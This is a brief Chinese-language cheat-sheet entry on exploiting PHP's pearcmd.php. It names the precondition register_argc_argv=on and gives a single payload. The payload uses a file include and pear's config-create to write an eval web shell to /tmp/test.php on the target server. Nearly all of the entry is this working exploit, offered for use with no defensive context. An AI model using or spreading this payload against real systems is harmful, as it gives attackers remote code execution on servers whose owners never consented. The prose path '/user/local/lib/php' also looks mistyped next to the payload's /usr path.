### 🍐 pear.php

> pear全称PHP Extension and Application Repository，php扩展和应用仓库，在docker中默认安装，路径为/user/local/lib/php.

前提需要：`register_argc_argv` 是 `on`

```php
?+config-create+/&file=/usr/local/lib/php/pearcmd&/<?=@eval($_POST['cmd']);?>+/tmp/test.php
```

![image-20240910220705627](https://gitee.com/bx33661/image/raw/master/path/image-20240910220705627.png)

